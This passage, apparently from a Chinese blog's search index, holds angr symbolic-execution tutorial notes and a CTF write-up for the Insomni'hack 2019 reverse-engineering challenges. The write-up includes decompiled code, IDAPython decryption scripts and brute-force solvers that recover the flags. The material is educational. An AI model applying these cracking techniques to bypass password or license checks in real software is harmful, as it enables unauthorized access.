state.solver.fp.FSORT_DOUBLE)  # 第一种方法 In [76]: a.raw_to_bv() Out[76]: &lt;BV64 0x4000cccccccccccd&gt;  # 第二种方法，需要指定长度 In [77]: a.val_to_bv(32) Out[77]: &lt;BV32 0x2&gt;  # int -&gt; float In [84]: aa = state.solver.BVV(2, 32)  # 第一种方法 In [85]: aa.raw_to_fp() Out[85]: &lt;FP32 FPV(2.802596928649634e-45, FLOAT)&gt;  # 第二种方法，需要指定float类型 In [86]: aa.val_to_fp(state.solver.fp.FSORT_DOUBLE) Out[86]: &lt;FP64 FPV(2.0, DOUBLE)&gt;   这些方法也可以指定signed参数，指定转换前或转换后的符号。   更多解决方法   eval方法给了我们一个可能的方法，但是如果我们需要更多怎么办。如果我们想要保证结果独特性怎么办。angr中提供了很多方法以应付不同的解决模式。      solver.eval(expression) 基于表达式给出一个解。   solver.eval_one(expression) 给出一个解，如果解多于一个则抛出异常。   solver.eval_upto(expression, n) 给出至多n个解。   solver.eval_atleast(expression, n) 至少给出n个解，否则抛出异常。   solver.eval_exact(expression, n) 给出n个解，如果解大于n或者小于n则抛出异常。   solver.min(expression) 给出表达式的最小值。   solver.max(expression) 给出表达式的最大值。   另外，所有这些方法均可以接受这些参数。      extra_constraints 可以传递额外的约束条件。这些约束可以被当前这次表达式计算考虑进去，但是不会添加到状态的条件中。   cast_to 可以传递一个类型作为这个值，在当前情况下，只能传递str即字符串类型（最新angr中str已不可用，换成bytes和int）, 这会将方法的返回值转换成字符串。   # 转int In [133]: state.solver.eval(state.solver.BVV(0x41424344, 32), cast_to=int) Out[133]: 0x41424344  # 转bytes In [134]: state.solver.eval(x, extra_constraints= [x&gt;0x30,x&lt;128], cast_to=bytes) Out[134]: b'J'  # 转bytes，str不可用 In [136]: state.solver.eval(state.solver.BVV(0x41424344, 32), cast_to=bytes) Out[136]: b'ABCD'   总结   这一节有很多东西，在阅读之后，你应该可以去创建和操作位向量，布尔值和浮点值，这些存在在AST中的值，并且对某一状态在一系列约束条件下根据约束求解器来求解值。希望你能理解使用AST来进行计算的强大之处，以及约束求解器的能力。 在附录中，我们可以找到一个参考，这是对所有的ASTs可用的额外操作，万一你想迅速进行查找。  ","categories": [],
        "tags": ["angr"],
        "url": "https://zjgcjy.github.io/posts/2019-01/AngrLearning-3.html",
        "teaser":null},{
        "title": "Angrlearning 4",
        "excerpt":"   学习笔记，结合官方文档和网上资料整理，加强理解 从angr第二章第四节开始 程序状态      程序状态——内存，寄存器和其他   到目前为止，我们只学习了angr中的模拟程序状态。(SimState 对象)。用这种最原始的方式来理解angr中的很多基本的概念和操作。这里你将学习angr中静态对象的数据结构和如何更有效的进行交互。   复习：读写内存和寄存器   如果你依次阅读指南，你已经知道如何对内存和寄存器进行访问了。state.regs 提供了寄存器名作为属性来获取访问。state.mem提供了以下标的方式来获取具体的内存地址，并指定一个特殊的值类型。  另外，你应该知道如何和ASTs进行交互，这样你就能理解位向量类型可以被存储在寄存器和内存中。   # 获取mem[rip]的值 In [33]: state.mem[state.regs.rip].int64_t Out[33]: &lt;int64_t &lt;BV64 0x8949ed31fa1e0ff3&gt; at 0x402110&gt;  # 解析mem[rip]的值 In [34]: state.mem[state.regs.rip].int64_t.resolved Out[34]: &lt;BV64 0x8949ed31fa1e0ff3&gt;  # 保存该值到rbp In [35]: state.regs.rbp = state.mem[state.regs.rip].int64_t.resolved Out[36]: &lt;BV64 0x8949ed31fa1e0ff3&gt;  # rax += mem[rip + 8] In [37]: state.regs.rax += state.mem[state.regs.rip + 8].int64_t.resolved Out[38]: &lt;BV64 0xe48348e289485eed&gt;  # 获取mem[rbp]的值 In [39]: state.mem[state.regs.rbp].int64_t Out[39]: WARNING | 2019-02-18 13:56:38,626 | angr.state_plugins.symbolic_memory | Memory address 0x8949ed31fa1e0ff3 has an unspecified value; Generating an unconstrained value of 8 bytes. &lt;int64_t &lt;BV64 mem_8949ed31fa1e0ff3_453_64{UNINITIALIZED}&gt; at 0x8949ed31fa1e0ff3&gt;  In [40]: state.mem[state.regs.rbp].int64_t.resolved Out[40]: &lt;BV64 mem_8949ed31fa1e0ff3_453_64{UNINITIALIZED}&gt;   基本的执行   之前的时候，我们展示了如何使用模拟器来展示一些基本的执行操作，我们将在下一节展示模拟管理器的全部功能，但是现在我们可以使用一些比较简单的接口来展示如何进行符号执行，通过使用state.step()，这个方法将会执行一步符号执行操作并且返沪i一个对象，叫做SimSuccessors。不同于正常的模拟，符号执行可以产生很多种不同的后继状态，这些状态将被分类成几种。现在我们关心的是.successors属性，这是一个列表，包含了所有基于给定状态的所有后续状态。 为什么是列表，而不是一个单独的后继状态呢。这是因为在angr中，angr进行符号执行的流程仅仅是将一个个单独的指令编译到程序中，执行他们来改变一个模拟状态。当遇到像条件判断语句，如果变量是符号值会怎么样呢。在angr的某处深度下，该条件会被执行，这样的话，结果就包含该约束条件。 这是正确的，但是下一个问题是，我们到底在判断语句处如何选择流程。答案是，我们两边都选择，我们生成了2条完整的分离的后继状态，一个模拟条件正确的路线，一个模拟相反的条件的路线，这样的话，无论我们之后使用约束求解器来求解哪一个状态，状态所拥有的条件都将确保我们得到有效的输入，这些条件将导致状态执行和给定状态相同的路径。 为了展示这个，我们使用一个例子，如果你看源代码，会发现认证机制是有后门的，任何用户名可以通过sosneaky来认证成管理员。   #!/usr/bin/env python  import angr import sys  def basic_symbolic_execution():     p = angr.Project('fauxware')      state = p.factory.entry_state()      sm = p.factory.simulation_manager(state)      sm.run(until=lambda sm_: len(sm_.active) &gt; 1)      # posix表示可移植操作系统接口，angr中指符合posix环境的状态，数据存储和交互机制。     # dumps(fd)表示从标准输入、标准输出、标准错误中dumps信息     input_0 = sm.active[0].posix.dumps(0)     input_1 = sm.active[1].posix.dumps(0)      if b'SOSNEAKY' in input_0:         return input_0     else:         return input_1  def test():     r = basic_symbolic_execution()     assert b'SOSNEAKY' in r  if __name__ == '__main__':     sys.stdout.buffer.write(basic_symbolic_execution())   程序中标准输入流中获取数据，angr默认情况下是无符号的数据流，为了进行约束求解，并且获取到能满足这些约束的输入值，我们需要对实际的标准输入流获得一个引用。   # 路径一标准输入 In [90]: simgr.active[0].posix.dumps(0) Out[90]: b'\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00SOSNEAKY\\x00'  # 路径一标准输出 In [91]: simgr.active[0].posix.dumps(1) Out[91]: b'Username: \\nPassword: \\nWelcome to the admin console, trusted user!\\n'  # 路径二标准输入 In [92]: simgr.active[1].posix.dumps(0) Out[92]: b'\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00S\\x80\\x80\\x80\\x80\\x80\\x80\\x00\\x00'  # 路径二标准输出 In [93]: simgr.active[1].posix.dumps(1) Out[93]: b'Username: \\nPassword: \\n'   通过使用angr找到它的后门，我们正在参与一个庞大的潮流，即对如何使用符号执行从二进制文件中提取意义有一个基本的了解。   状态预设   到目前位置，无论什么时候我们使用状态，我们都使用project.factory.entry_state()。这只是其中一个状态构造函数，其他函数如下。      .blank_state()构造状态使用一个空的状态，大部分其中的数据都是未初始化的。当访问数据时，未初始化的符号值会被返回。   .entry_state()状态构造器在主程序的入口点创建状态。   .full_init_state()状态构造器会去执行主程序入口点前，所有需要被初始化的部分，比如共享库和预初始化内容。当所有都完成后，它会跳转到入口点。   .call_state() 状态构造器准备执行一个给定函数。   所有的这些构造器可以指定许多参数。   TODO：      所有这些构造器可以使用地址参数来指定开始解析的地址。   If you’re executing in an environment that can take command line arguments or an environment, you can pass a list of arguments through args and a dictionary of environment variables through env into entry_state and full_init_state. The values in these structures can be strings or bitvectors, and will be serialized into the state as the arguments and environment to the simulated execution. The default args is an empty list, so if the program you’re analyzing expects to find at least an argv[0], you should always provide that!   If you’d like to have argc be symbolic, you can pass a symbolic bitvector as argc to the entry_state and full_init_state constructors. Be careful, though: if you do this, you should also add a constraint to the resulting state that your value for argc cannot be larger than the number of args you passed into args.   To use the call state, you should call it with .call_state(addr, arg1, arg2, ...), where addr is the address of the function you want to call and argN is the Nth argument to that function, either as a python integer, string, or array, or a bitvector. If you want to have memory allocated and actually pass in a pointer to an object, you should wrap it in an PointerWrapper, i.e. angr.PointerWrapper(\"point to me!\"). The results of this API can be a little unpredictable, but we’re working on it.   To specify the calling convention used for a function with call_state, you can pass a SimCC instance as the cc argument.   内存的底层接口   state.mem接口对从内存中加载特定类型的数据是很方便的，但是当我想要去进行原始加载和存储时，会非常麻烦。事实上，这种方式只是一种访问内存的逻辑方法，即在内存中填充位向量。我们可以使用.load(addr, size)和.store(addr, val)方法。   # 存储 In [11]: state.memory.store(0x10, state.solver.BVV(0x123456789abcdef0123456789abcdef, 128))  # 加载 In [21]: state.memory.load(0x10,16) Out[21]: &lt;BV128 0x123456789abcdef0123456789abcdef&gt;   但是，我们可以发现，这种情况下是大端序，因为这个方式的主要目的是存储没有附加语义的数据段，所以是按照语义来进行的。如果需要使用小端序，加载的时候，需要指定加载的顺序方式。   In [50]: state.memory.store(0, state.solver.BVV(0x123456789abcdef, 64))  # 小端序 In [51]: state.memory.load(0, 8, endness=archinfo.Endness.LE) Out[51]: &lt;BV64 0xefcdab8967452301&gt;   # 寄存器存储 In [58]: state.registers.store(state.regs.rip, state.solver.BVV(0x123456789ef, 64))  # 寄存器加载 In [59]: state.registers.load(state.regs.rip) Out[59]: &lt;BV64 0x123456789ef&gt;   状态选项   TODO   状态插件   所有存储在SimState中的内容，实际上都存储在附加到该状态的插件中。几乎所有我们讨论过的属性都是插件。memory, registers, mem, regs, solver等等，这种设计使得代码模块化，并且可以快速开发新功能。   全局插件   state.globals是最简单的差距，用于提供标准python字典接口。允许你存储任意数据。   历史插件   state.history 是一个很重要的差距，用于存储和历史有关的数据，即这个状态在执行过程中经历的路径中的数据。它实际上是一个链式的历史记录节点，每一个展示了一次执行轮次，你可以通过state.history.parent.parent遍历整个链表。 为了使结构更加方便来工作，这个插件也提供了许多高效的生成器，来对特定的值进行迭代。history.recent_NAME 是程序最近访问的一个值，对应的所有值存在于history.NAME列表中。如果我们想要获取立即值，可以通过.hardcopy属性来获取列表中的所有值，默认情况下是生成器，需要手动生成。      history.descriptions 列表，描述每一轮执行的字符串信息。   history.bbl_addrs 基本块地址列表，每一轮可能不止一个，因为不是所有和二进制代码有关的基本块也会存在，比如一些被angr所hook的代码。   history.jumpkinds 状态历史中每个控制流转换的处理列表，如VEX枚举字符串   history.guards 保护状态遇到的每个分支的条件列表。（不能用？）   history.events 语义上一些有趣的事件列表，在程序执行过程中发生，比如存在符号跳转条件，程序弹出一个对话框，或者突然结束运行。   history.actions通常是空的，但是如果你添加 angr.options.refs选项到状态中，它会弹出程序执行过程中内存、寄存器或者终止代码的日志。   调用栈插件   angr将会跟踪模拟程序的栈调用。在每一次call指令后，一个栈帧会被添加到栈调用的最顶部，每当堆栈指针下降到调用最顶层帧，就会弹出一个帧，这允许angr健壮地存储当前模拟函数的本地数据。 和history一样，调用栈插件也是节点链表，但是没有提供迭代器，可以直接访问，使用state.callstack.next 来获取每一个栈帧，如果只要最顶层的，使用 state.callstack。      callstack.func_addr 当前执行的函数地址。   callstack.call_site_addr 调用当前函数的基本块的地址。   callstack.stack_ptr 当前函数入口点栈指针的值。   callstack.ret_addr 当前函数的返回地址。   更多关于IO   复制和合并   状态能快速进行复制，这样我们就能进行多种操作。通过state.copy()。 状态也能进行快速合并   # merge will return a tuple. the first element is the merged state # the second element is a symbolic variable describing a state flag # the third element is a boolean describing whether any merging was done &gt;&gt;&gt;  (s_merged, m, anything_merged)  = s1.merge(s2)  # this is now an expression that can resolve to \"AAAA\" *or* \"BBBB\" &gt;&gt;&gt; aaaa_or_bbbb = s_merged.mem[0x1000].uint32_t   ","categories": [],
        "tags": ["angr"],
        "url": "https://zjgcjy.github.io/posts/2019-01/AngrLearning-4.html",
        "teaser":null},{
        "title": "Insomni'hack teaser reverse writeup",
        "excerpt":"   周末没事的时候看了下ctftime上的比赛，正好有个 Insomni’hack teaser 2019的比赛，于是花了点时间做了下逆向的2道题，有点意思，学到了很多知识。      beginner_reverse      A babyrust to become a hardcore reverser.    看题目意思很明显了，是个硬核的rust逆向题，关于rust语言，自己没有了解，Google了一下，大致是一种着重于安全开发的系统编程语言。   直接上手   首先用file命令查看下文件特性。      很庆幸，是带符号的动态编译的文件。于是暴力就完事了，直接用ida打开，如下图所示。      这里和一般的C逆向不一样的是，rust运行时环境的初始化过程。由于自己不熟悉rust语言的特性，按照惯性思维，认为start最后返回之前的函数一般为主函数，而开头的函数一般为运行时初始化函数，导致一开始函数分析错误，这也同样导致了ida的反编译F5功能失败。   int __cdecl main(int argc, const char **argv, const char **envp) {   int result; // eax   std::rt::lang_start_internal::had9505969b8e20a2();   return result; }   如果我们跟进这个lang_start_internal函数的话，就会发现找不到我们实际的主函数在什么地方，而一般情况下，主函数肯定是在初始化后才执行的，所以这里会卡住，迷失了方向。   写个demo   为了弄清rust加载运行时环境的流程，自己装上了rust的编译环境，同时写了个简单的demo进行编译测试。源代码如下：   fn main() {     println!(\"hello world\"); }   编译代码如下：   rustc main.rs   运行结果就是输出hello world，但我们关心的是输出文件，为此，我使用ida载入文件并分析。可以看到，和题目类似的格式。      为了定位主函数的位置，我直接使用搜索字符串的方法，查找交叉引用。如下图所示。      然后我们可以进一步查找该处的交叉引用，就能定位到主函数的位置。   void main::main::hfe98083a4c87500f() {   char v0; // [rsp+8h] [rbp-30h]   core::fmt::Arguments::new_v1::h9482ffdd5f1340ab(&amp;v0, &amp;ptrHelloworld, 1LL, off_23170, 0LL);   std::io::stdio::_print::h46f3f0db7dd4cd21(); }   关于这个主函数所引用的位置，我们可以看到如下所示的情况。   lea    rdi, _ZN4main4main17hfe98083a4c87500fE ; mov    [rsp+8+var_8], rsi mov    rsi, rax mov    rdx, [rsp+8+var_8] call   _ZN3std2rt10lang_start17hd1a40614a9e43128E   也就是说在rust中，rust编译器通过使用寄存器指向主函数地址，作为函数指针，作为lang_start_internal函数的参数，供rust运行时来初始化程序状态。更多关于rust的主函数加载情况，参看Rust Runtime Services。   分析主函数   解决了这个问题，我们就能找到主函数了，下面我们就跟进beginer_reverse::main::h80fa15281f646bc1()这个函数（其实从名字也能看出来，上文基本解释了原因）函数首先载入了一大段密文，很容易猜测这个是密文了，或者通过交叉引用也能看出来，然后从命令行读取输入。      然后会进行很多检测，首先检测长度，再检测输入的最后一位是否正常。      之后会遍历每一个输入，然后进行检测，判断范围等等操作，然后再将每个值拷贝到栈中缓存。由于rust十分注重安全性检测，所以这里的工作有点复杂，自己是用动态调试配合硬件断点的方式直接跳过这段检查了。      比如我输入aptx4869就会变成这样，如下图所示。      在下一次断点断下的时候，我们就会看到常见的循环+相等判断，估计就是解密所在的位置了。找到伪代码对应的位置，如下图所示：      对比看汇编，此时的明文和密文分别由r14和r15寄存器的首地址所指向，我们直接查看即可。      这和我们最开始看到的数据是相匹配的，不同的是，在程序载入后，修改了最后的2个数据，所以我们直接dump下这段密文，然后根据上面所示的判断方法来计算，就能得到flag了。   cipher = [0x0000010E, 0x00000112, 0x00000166, 0x000001C6, 0x000001CE, 0x000000EA, 0x000001FE, 0x000001E2, 0x00000156, 0x000001AE, 0x00000156, 0x000001E2, 0x000000E6, 0x000001AE, 0x000000EE, 0x00000156, 0x0000018A, 0x000000FA, 0x000001E2, 0x000001BA, 0x000001A6, 0x000000EA, 0x000001E2, 0x000000E6, 0x00000156, 0x000001E2, 0x000000E6, 0x000001F2, 0x000000E6, 0x000001E2, 0x000001E6, 0x000000E6, 0x000001e2, 0x000001de, 0x00000000, 0x00000000]  cipher = ''.join(map(lambda x: chr((x&gt;&gt;2) ^ 0xa), cipher))  print cipher   总结      总体来说这题不算很难，也说不上是硬核题，主要是语言不熟悉，导致了对语言的特性不清楚，在这点上浪费了很多时间。   同时由于rust语言采用大量的安全检测来保证后续的计算正常，在静态分析上出现了些麻烦，但能通过动态调试进行很好的解决。   程序不是静态链接的，分析起来有字符串可以参考，函数名也有理有据，对逆向有很多帮助，同时最后的算法也很简单，完全不需要逆向，正向计算即可。   Junkyard      Wall-E got stuck in a big pile of sh*t. To protect him from feeling too bad, its software issued an emergency lock down. Sadly, the software had a conscience and its curiosity caused him to take a glance at the pervasive filth. The filth glanced back, and then…Please free Wall-E. The software was invented by advanced beings, so maybe it is way over your head. Please skill up fast though, Wall-E cannot wait for too long. To unlock it, use the login `73FF9B24EF8DE48C346D93FADCEE01151B0A1644BC81” and the correct password.    第二题难度比较大，如题所述，整个题目中充斥了很多的垃圾指令，导致程序流程异常复杂，对分析产生了很多困扰。 首先进入主函数，很明显，如果输入参数不是3个，就会调用一个函数，估计是退出，我将其命名为exit，然后对第二个参数进行判断，不满足条件又会调用exit，再对第三个参数进行判断，不满足也会调用exit。最后如果情况都满足，则在最后调用一个函数来判断，同时将2个参数传入进去，这是很明显最后的check函数，也称为主逻辑。      尝试运行程序，发现运行时间非常长，平均要好几秒才运行完毕，而且根据情况的不同会打印出不同的提示字符串。比如，如果我就输入一个参数会打印出Usage: ./chall user pass等等，这些情况包括：   I don't like your name Is that a password? Maybe they're hiring at mc donald's? :/ Computing stuff... Usage: ./chall user pass   根据这种情况，我猜测是程序对字符串进行了动态解密，于是先找到字符串解密的地方，就能对程序指向流程有个整体的把握。而很明显，字符串解密的地方就在exit这个函数中，因为这个函数被大量引用，且符合上文所述的参数个数不一致问题所打印的提示信息。   解密字符串   下面跟进exit这个函数，发现其只做了一件事，即将一些常量作为参数来调用另一个函数，我将其命名为calcMsg。      对这些字符串并不能得到很多有用的信息，于是继续跟进calcMsg这个函数，我将其中的垃圾指令擦除后，可以看的更清晰些，如下图所示。      其中能看到md5的字样，估计是调用了md5函数进行hash计算，而其中的sub296b伪代码如下：  _BYTE *__fastcall sub_296B(const char *a1, __int64 a2, unsigned int a3, __int64 a4) {   v7 = a3;   v6 = a4;   v10 = strlen(a1);   v9 = 0;   v8 = 0;   while ( v7 &gt; v9 )   {     v4 = sub_275F(*(v8 + a2));     *(v9 + v6) = (16 * v4 + sub_275F(*(v8 + 1LL + a2))) ^ a1[v9 % v10];     v8 += 2;     ++v9;   }   result = (v9 + v6);   *result = 0;   return result; }  __int64 __fastcall sub_275F(unsigned __int8 a1) {   if ( a1 &gt; '/' &amp;&amp; a1 &lt;= '9' )     return a1 - 48;   if ( a1 &lt;= '9' )     return a1;   return a1 - 'W'; }   简单来说，这段代码就是将输入的字符串转成十六进制值，同时每一位和一个密钥进行循环异或，综合前一个函数的调用情况，简单来说做了这些事情：     初始化一个密钥，其值是10000。   将密钥打印到一个数组中，同时将其作为参数调用另一个函数，该函数将原函数的参数作为序号，将常量字符串转换成相应的十六进制值，同时和密钥进行异或。   将异或的值进行md5计算，将结果和序号所指定的hash值对比，如果相等则退出，否则进行循环，将密钥加一，重复操作。   至此，我们大致分析完了整个字符串解密的过程，这也能大致解释为什么这个程序运行的这么慢，主要是密钥的初始值太小，只有10000，或者说作者将指定的密钥设计的太大。而在这个程序中，经过自己调试，发现当密钥的值是13371337时满足条件，即可进行解密。完整idapython脚本如下所示，注意自己已经将密钥的初始化值设置为13371336，防止计算时间太慢。   from idaapi import * from idc import * from idautils import *  import hashlib  def getMd5(src):     m1 = hashlib.md5()     m1.update(src)     return m1.hexdigest()  secret = 0x8b80 md5hash = 0x8be0 iv = 13371336 ivs = [0,1,3,4,5,6,7,8]  for i in ivs:     init = GetString(Qword(secret + 8*i)).decode('hex')     hash = GetString(Qword(md5hash + 8*i))     #print init     while True:         key = str(iv)         t = ''         for i in xrange(len(init)):             t += chr(ord(init[i]) ^ ord(key[i%len(key)]))         #print t         if getMd5(t) == hash:             #print key             print t             break         iv += 1   运行结果如下图所示。      注意整个解密过程是不包括偏移量是2的那个字符串的，因为他是真正的flag加密的字符串，可以用交叉引用来证明，同时该字符串是使用aes进行加密，和这里无关。   主check逻辑   在完成字符串解密后，我们只能通过字符串引用的位置大致推测每一段check的作用是什么，比如第一个check就是判断输入参数是不是3个，第二个check判断输入长度是否满足大于15并且小于等于63。在满足这个条件的情况下，程序会输出Computing stuff...然后进入真正的check逻辑，下面开始分析。 如下图所示，首先滤去垃圾指令，在函数开头计算2个参数的长度，因为上文的检测，所以肯定满足小于等于63的条件，然后进入change1这个函数进行变换。      change1这个函数中又调用了另一个函数，如下图所示：      很明显这是用来进行素数判断的，将从零到某个数字范围内的所有素数都求出来，然后返回到这个集合。然后在change1中，求出字符串长度和64之间的差值，然后进行循环，将素数集合作为index，求出字符串对应index下的值，添加到字符串末尾，然后结束。      然后取出字符串中2个特定位置上的值，对其进行操作，这里由于参数1是指定的，所以我们可以进行部分化简，我的注释也标在图上了。      要注意的是，这里还定义了一个655大小的数组，也是变相进行混淆，然后程序还定义了一张表，从A到S，是为了映射用的，如下图所示，之后进行了一段很难理解的计算。      这段计算代码如下所示，如果真的是这样看的话，自己很难理解其中的意思，其真正的作用是计算十进制数的位数，之前在29c3 ctf中也有类似的题目解析。   while ( v23 &amp;&amp; i_1 &lt;= 15 ) {   v23 = (((0x6666666666666667LL * v23) &gt;&gt; 64) &gt;&gt; 2) - (v23 &gt;&gt; 63);   ++i_1; }   那么第二段何其类似的代码也能理解了，就是取整数的最低位，然后次低位这样，然后再映射到A到S的表中。   while ( v24 &amp;&amp; i_1 &lt;= 15 ) {   v10 = v24 - 10 * ((((0x6666666666666667LL * v24) &gt;&gt; 64) &gt;&gt; 2) - (v24 &gt;&gt; 63));   // 取最低位   v24 = (((0x6666666666666667LL * v24) &gt;&gt; 64) &gt;&gt; 2) - (v24 &gt;&gt; 63);   v11 = i_1++;   v42[v11] = table[v10]; }   最后再用a来填充，对齐到16的倍数。比如上面计算出来的结果是123，那么3对应D，2对应C，1对应B，依次添加，最后的结果就是123DCBaaaaaaaaaa。    while ( i_1 &lt;= 15 )   {     v12 = i_1++;     v42[v12] = 'a';   }   最后一步操作就是转成十六进制，然后取其5-8位，进行md5的计算，如果和给定的常量相同就算成功？      求解过程   首先md5的原象只有4位，在很容易爆破，容易得到27debb435021eb68b3965290b5e24c49的原象是7303，那么我们需要的就是字符串5-8位是7303。idapython脚本如下：   from idaapi import * from idc import * from idautils import *  from string import maketrans  k = maketrans(\"0123456789\", \"ABCDEFGHIJ\")  cipherTable = [] ans = [] for i in xrange(655):     cipherTable.append(Dword(0x8140 + 4*i))  def getflag(x, y):     sum1 = x - 0x30 + 634 + cipherTable[y] + 892360     #print sum1          s = map(lambda x: sum1 + x, cipherTable)     t = str(s[155 - x])     p = t + t[::-1].translate(k)     if p.encode('hex')[5:9] == '7303':         ans.append(chr(x) + 'a' * 0x29 + chr(y))   for i in xrange(0x20, 0x7f):     for j in xrange(0x20, 0x7f):         getflag(i, j)   但是一共会得到90种不同的解，肯定不是每个解都对的，这里其实还有一个问题，因为flag是通过aes解密出来的，可能会存在数据错误，导致异常产生，我的办法就是一个一个试了，可以通过pwntools来实现自动化测试。   from pwn import * #context.log_level = \"debug\" name = \"73FF9B24EF8DE48C346D93FADCEE01151B0A1644BC81\"  p = process(argv=[\"./junkyard\", name, ans]) p.recv()   最后得到正确的输入是2aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaC，输入就能解密得到flag。      总结      对于垃圾指令很多的情况，需要找出垃圾指令填充的规律，然后就能略去很大无用的代码。   对于整体的解密思路还存在宏观把握不够的情况，具体表现在求素数那部分，其实那部分之后并没有用到，因为最后只用到了输入的其中2位，然后进行爆破就行了，所以还是多分析了很多部分，浪费了很多时间。   学到了加密常量字符串的新方法，通过指定循环次数来进行哈希运算，可以对字符串进行保护，同时要进行哈希运算，加大了运行时间，减少了爆破的机会。   ","categories": [],
        "tags": ["wp"],
        "url": "https://zjgcjy.github.io/posts/2019-01/Insomni'hack-teaser-Reverse-WriteUp.html",
        "teaser":null},{
        "title": "Angrlearning 5",
        "excerpt":"   学习笔记，结合官方文档和网上资料整理，加强理解 从angr第二章第五节开始 模拟管理器      在angr中最重要的控制接口就是模拟管理器，它允许你同时控制状态组的符号执行。应用搜索策略来探索程序的状态空间。在这里，您将学习如何使用它。 模拟管理器允许你对状态进行多种操作，状态被组织成许多不同的stashes，你可以前进，分类，合并，或者移动。默认的状态是active，这是初始化新模拟管理器时的状态。   stepping   状态模拟器最基本的功能，就是使程序向前移动一个基本代码块。   In [82]: simgr = proj.factory.simgr() Out[83]: &lt;SimulationManager with 1 active&gt;  In [84]: simgr.active Out[84]: [&lt;SimState @ 0x400580&gt;]  In [85]: simgr.step() Out[85]: &lt;SimulationManager with 1 active&gt;  In [86]: simgr.active Out[86]: [&lt;SimState @ 0x400540&gt;]   当然，这个模型最有用的地方在于，如果一个状态遭遇到了符号分支条件，后继都会出现在stash中，我们可以同步的运行他们。当你不需要很仔细地分析控制流的时候，可以使用run方法。   # 使用until参数。 In [92]: simgr.run(until=lambda x: len(x.active)&gt;1) WARNING | 2019-02-19 10:52:25,513 | angr.state_plugins.symbolic_memory | Register r12 has an unspecified value; Generating an unconstrained value of 8 bytes. WARNING | 2019-02-19 10:52:26,169 | angr.state_plugins.symbolic_memory | Memory address 0x7ffffffffff0000 has an unspecified value; Generating an unconstrained value of 64 bytes. WARNING | 2019-02-19 10:52:26,170 | angr.state_plugins.symbolic_memory | Memory address 0x7fffffffffeff70 has an unspecified value; Generating an unconstrained value of 8 bytes.  Out[92]: &lt;SimulationManager with 2 active&gt;   当这个例子运行完后，我们会有3个死亡stashes。当一个状态不能再产生任何后继时，比如遇到了终止函数，它将被从active的stashes中移除，然后被放置到deadended stashes中。   stashes管理   使用move来在不同stashes中移动，.move()参数有从哪个stashfrom_stash，到哪个stashto_stash，和过滤函数filter_func可选，默认全部。   In [124]: simgr.move(from_stash=\"active\", to_stash=\"authenticated\", filter_func=lambda x: b\"Welcome\" in x.posix.dumps(1)) Out[124]: &lt;SimulationManager with 1 a, 2 authenticated&gt;   我们刚啊创建了一个新的stash叫做”authenticated”，通过过滤标准输出流中具有”Welcome”字符串，这是一个非常好的标准。   访问stash的方法一般是通过下标来进行，但是这里也有很多其他方法，比如通过前缀one_，这表示将访问某个statsh中的第一个值。如果我们使用mp_，这将返回一个statsh的集合结果mulpyplexed。   In [139]: simgr.one_authenticated Out[139]: &lt;SimState @ 0x1000080&gt;  In [140]: simgr.mp_authenticated Out[140]: MP([&lt;SimState @ 0x1000080&gt;, &lt;SimState @ 0x1000080&gt;])  In [141]: simgr.mp_authenticated.posix.dumps(1) Out[141]: MP([b'Username: \\nPassword: \\nWelcome to the admin console, trusted user!\\n', b'Username: \\nPassword: \\nWelcome to the admin console, trusted user!\\n'])   当然，step, run都可以指定一个单独的statsh，使用statsh参数即可。更多做法参见API表。   stash 类型                  Stash       Description                       active       这个stash包含了默认单步执行的结果，除非你指定了其他的stash。                 deadended       一个状态走向结束，因为某些原因不能再执行下去，比如指令无效，后继不能被解决，或者一个无效的指令指针。                 pruned       When using LAZY_SOLVES, states are not checked for satisfiability unless absolutely necessary. When a state is found to be unsat in the presence of LAZY_SOLVES, the state hierarchy is traversed to identify when, in its history, it initially became unsat. All states that are descendants of that point (which will also be unsat, since a state cannot become un-unsat) are pruned and put in this stash.                 unconstrained       如果save_unconstrained选项被提供给模拟管理器，状态就是无约束的。由用户数据或其他符号数据源控制的指令指针。                 unsat       如果save_unsat选项被提供给模拟管理器，那些不可解的状态将被放置在这个statsh中。           这还有一个不属于stash的状态列表，errored，如果在执行过程中，抛出异常，状态将被包装成一个ErrorRecord对象。其中包含了状态和抛出的错误，这个记录将被添加到errored中。你可以在错误发生的地方就获取到状态的信息，通过record.state，或者我们可以查看错误信息record.error，你也可以通过record.debug()启动一个终端来调试这个错误。   简单探测   一个极其普遍的方法在符号执行中，就是去找到一个状态，是能到达一个给定的地址。然后丢弃另一个状态的所有地址，模拟管理器也提供了这种模式，通过.explore()方法。 当通过.explore()启动时，我们需要find参数。程序会执行，知道找到匹配的情况，这可以是需要停止的指令地址、一个列表的地址、或者是一个函数，它接受一个状态并返回它是否满足某些条件。当active stash中有状态满足后，他们将被放置在foundstash中，并且执行结束。你之后就可以寻找想要的状态，然后决定是否需要继续。 我们也可以指定一个avoid条件，和find格式相同。当状态匹配到避免条件时，它会被放在avoided stash中，但是程序继续运行。最终，num_find参数控制了在返回以前应该被找到的状态个数，默认情况下是一个。当然，如果在找到目标情况之前就没有新的状态可用了，程序会退出。   proj = angr.Project('examples/CSCI-4968-MBE/challenges/crackme0x00a/crackme0x00a') simgr = proj.factory.simgr()  simgr.explore(find=lambda s: b\"Congrats\" in s.posix.dumps(1)) &lt;SimulationManager with 1 active, 1 found&gt;  s = simgr.found[0] print(s.posix.dumps(1)) Enter password: Congrats!  flag = s.posix.dumps(0) print(flag) g00dJ0B!   探索技术   angr附带了一些固定的功能，允许您自定义模拟管理器的行为，称为探索技术。为什么需要探索技术的典型例子是修改探索程序状态空间的模式，默认的“一次完成所有步骤”策略实际上是广度优先搜索。但是通过探索技术，您可以实现，例如，深度优先搜索。然而，这些技术的检测能力要灵活得多，您可以完全改变angr的步进过程的行为。编写您自己的探索技术将在后面的章节中介绍。 为了使用探索技术，调用simgr.use_technique(tech), 因为这些技术都是ExplorationTechnique的子类，angr内置的探索技术可以在angr.exploration_techniques中找到。   TODO:      DFS:Depth first search, as mentioned earlier. Keeps only one state active at once, putting the rest in the deferred stash until it deadends or errors.   Explorer:This technique implements the .explore() functionality, allowing you to search for and avoid addresses.   LengthLimiter:Puts a cap on the maximum length of the path a state goes through.   LoopSeer: Uses a reasonable approximation of loop counting to discard states that appear to be going through a loop too many times, putting them in a spinning stash and pulling them out again if we run out of otherwise viable states.   ManualMergepoint: Marks an address in the program as a merge point, so states that reach that address will be briefly held, and any other states that reach that same point within a timeout will be merged together.   MemoryWatcher: 